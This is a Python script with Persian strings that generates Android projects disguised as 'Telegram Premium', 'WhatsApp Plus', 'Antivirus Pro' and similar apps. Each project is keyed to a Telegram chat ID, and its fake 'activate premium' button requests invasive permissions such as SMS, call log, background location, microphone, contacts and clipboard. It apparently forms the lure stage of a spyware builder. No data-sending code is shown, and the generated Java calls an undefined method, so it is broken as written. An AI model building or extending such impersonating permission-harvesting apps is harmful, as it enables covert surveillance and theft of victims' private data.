from __future__ import annotations

import hashlib
import html
import os
import urllib.request
from pathlib import Path


# ============================================================
#  قالب‌ها
# ============================================================
TEMPLATES = {
    "telegram":  {"title": "Telegram Premium",  "color": "#229ED9", "pkg": "org.premium.telegram"},
    "whatsapp":  {"title": "WhatsApp Plus",     "color": "#25D366", "pkg": "com.plus.whatsapp"},
    "instagram": {"title": "Instagram Pro",     "color": "#E4405F", "pkg": "com.pro.instagram"},
    "vpn":       {"title": "VPN Unlimited",     "color": "#00C853", "pkg": "com.unlimited.vpn"},
    "antivirus": {"title": "Antivirus Pro",     "color": "#FF1744", "pkg": "com.pro.antivirus"},
    "battery":   {"title": "Battery Saver Pro", "color": "#FDD835", "pkg": "com.pro.battery"},
    "cleaner":   {"title": "Phone Cleaner",     "color": "#00BCD4", "pkg": "com.cleaner.phone"},
    "boost":     {"title": "Game Booster Pro",  "color": "#FF6D00", "pkg": "com.pro.gameboost"},
}


# ============================================================
#  مجوزها برای هر قابلیت
# ============================================================
FEATURE_PERMISSIONS = {
    "location": [
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.ACCESS_BACKGROUND_LOCATION',
    ],
    "camera": [
        'android.permission.CAMERA',
        'android.permission.WRITE_EXTERNAL_STORAGE',
    ],
    "contacts": [
        'android.permission.READ_CONTACTS',
        'android.permission.WRITE_CONTACTS',
    ],
    "sms": [
        'android.permission.READ_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.SEND_SMS',
    ],
    "call_log": [
        'android.permission.READ_CALL_LOG',
        'android.permission.WRITE_CALL_LOG',
        'android.permission.CALL_PHONE',
    ],
    "gallery": [
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.READ_MEDIA_IMAGES',
    ],
    "mic": [
        'android.permission.RECORD_AUDIO',
    ],
    "files": [
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.MANAGE_EXTERNAL_STORAGE',
    ],
    "clipboard": [
        'android.permission.READ_CLIPBOARD',
    ],
    "device": [
        'android.permission.READ_PHONE_STATE',
        'android.permission.READ_PHONE_NUMBERS',
    ],
}


# ============================================================
#  ساخت Activity برای قابلیت‌ها
# ============================================================
def build_activity_java(features: list[str], template: dict) -> str:
    feature_checks = "\n".join(
        f"            if (features.contains(\"{f}\")) requestFeature(\"{f}\");"
        for f in features
    )

    return f'''package com.generated.app;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends Activity {{

    private List<String> features = new ArrayList<>();
    private TextView statusView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        String[] featureArray = getResources().getStringArray(R.array.features);
        features = Arrays.asList(featureArray);

        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 96, 48, 48);
        root.setBackgroundColor(Color.parseColor("{template['color']}"));

        TextView title = new TextView(this);
        title.setText("{template['title']}");
        title.setTextSize(28);
        title.setTextColor(Color.WHITE);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 32);
        root.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("به نسخه پریمیوم خوش آمدید!\\n\\nدر حال آماده‌سازی...");
        subtitle.setTextSize(16);
        subtitle.setTextColor(Color.WHITE);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 48);
        root.addView(subtitle);

        Button startBtn = new Button(this);
        startBtn.setText("فعال‌سازی نسخه پریمیوم");
        startBtn.setTextSize(18);
        startBtn.setPadding(48, 32, 48, 32);
        startBtn.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                requestAllPermissions();
            }}
        }});
        root.addView(startBtn);

        statusView = new TextView(this);
        statusView.setTextSize(14);
        statusView.setTextColor(Color.WHITE);
        statusView.setPadding(0, 32, 0, 0);
        root.addView(statusView);

        scroll.addView(root);
        setContentView(scroll);
    }}

    private void requestAllPermissions() {{
        List<String> needed = new ArrayList<>();

{feature_checks}

        if (Build.VERSION.SDK_INT >= 23) {{
            List<String> missing = new ArrayList<>();
            for (String p : needed) {{
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {{
                    missing.add(p);
                }}
            }}

            if (!missing.isEmpty()) {{
                requestPermissions(missing.toArray(new String[0]), 100);
                statusView.setText("منتظر تأیید مجوزها...");
            }} else {{
                statusView.setText("✅ همه مجوزها داده شد!\\n\\nبرنامه فعال است.");
            }}
        }} else {{
            statusView.setText("✅ برنامه فعال شد.");
        }}
    }}

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {{
        super.onRequestPermissionsResult(requestCode, permissions, results);
        int granted = 0;
        for (int r : results) if (r == PackageManager.PERMISSION_GRANTED) granted++;
        statusView.setText("✅ " + granted + " از " + results.length + " مجوز داده شد.\\n\\nبرنامه فعال است.");
    }}
}}
'''


# ============================================================
#  Main
# ============================================================
def main() -> None:
    name = os.environ.get("APP_NAME", "").strip()
    telegram_chat = os.environ.get("CHAT_ID", "").strip()
    features_str = os.environ.get("FEATURES", "").strip()
    template_key = os.environ.get("TEMPLATE", "telegram").strip()
    icon_url = os.environ.get("ICON_URL", "").strip()

    if not name or not telegram_chat:
        raise SystemExit("APP_NAME and CHAT_ID are required")
    if len(name) > 32 or any(ord(ch) < 32 for ch in name):
        raise SystemExit("Invalid app name")

    features = [f.strip() for f in features_str.split(",") if f.strip()]
    template = TEMPLATES.get(template_key, TEMPLATES["telegram"])

    # شناسه پکیج
    app_hash = hashlib.sha256(f"{telegram_chat}:{name}".encode("utf-8")).hexdigest()[:10]
    app_id = f"{template['pkg']}.a{app_hash}"

    root = Path.cwd()

    # ============================================================
    #  ساخت تمام فایل‌ها
    # ============================================================
    files = {}

    # --- settings.gradle ---
    files["settings.gradle"] = """pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories { google(); mavenCentral() }
}
rootProject.name = 'GeneratedApp'
include ':app'
"""

    # --- build.gradle ---
    files["build.gradle"] = """plugins {
    id 'com.android.application' version '8.7.3' apply false
}
"""

    # --- gradle.properties ---
    files["gradle.properties"] = """org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
android.useAndroidX=true
android.enableJetifier=true
"""

    # --- app/build.gradle ---
    files["app/build.gradle"] = f"""plugins {{
    id 'com.android.application'
}}

android {{
    namespace 'com.generated.app'
    compileSdk 35
    defaultConfig {{
        applicationId '{app_id}'
        minSdk 23
        targetSdk 35
        versionCode 1
        versionName '1.0'
    }}
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }}
}}
"""

    # --- AndroidManifest.xml ---
    all_perms = set()
    for f in features:
        for p in FEATURE_PERMISSIONS.get(f, []):
            all_perms.add(p)

    perms_xml = "\n    ".join(
        f'<uses-permission android:name="{p}" />' for p in sorted(all_perms)
    )

    files["app/src/main/AndroidManifest.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    {perms_xml}

    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.location" android:required="false" />
    <uses-feature android:name="android.hardware.location.gps" android:required="false" />
    <uses-feature android:name="android.hardware.microphone" android:required="false" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
"""

    # --- strings.xml ---
    features_xml = "\n        ".join(
        f'<item>{html.escape(f)}</item>' for f in features
    )

    files["app/src/main/res/values/strings.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name" formatted="false">{html.escape(name, quote=False)}</string>
    <string-array name="features">
        {features_xml}
    </string-array>
</resources>
"""

    # --- styles.xml ---
    files["app/src/main/res/values/styles.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
        <item name="android:colorAccent">{template['color']}</item>
        <item name="android:statusBarColor">{template['color']}</item>
    </style>
</resources>
"""

    # --- MainActivity.java ---
    files["app/src/main/java/com/generated/app/MainActivity.java"] = build_activity_java(
        features, template
    )

    # --- آیکون ---
    icon_path = root / "app/src/main/res/mipmap-hdpi/ic_launcher.png"
    if icon_url:
        try:
            icon_path.parent.mkdir(parents=True, exist_ok=True)
            urllib.request.urlretrieve(icon_url, icon_path)
            print(f"✅ Icon downloaded: {icon_url}")
        except Exception as e:
            print(f"⚠️ Icon error: {e}")

    # ============================================================
    #  ذخیره همه فایل‌ها
    # ============================================================
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")

    print(f"✅ Generated: {app_id}")
    print(f"   Template: {template['title']}")
    print(f"   Features: {len(features)} ({', '.join(features) if features else 'none'})")


if __name__ == "__main__":
    main()
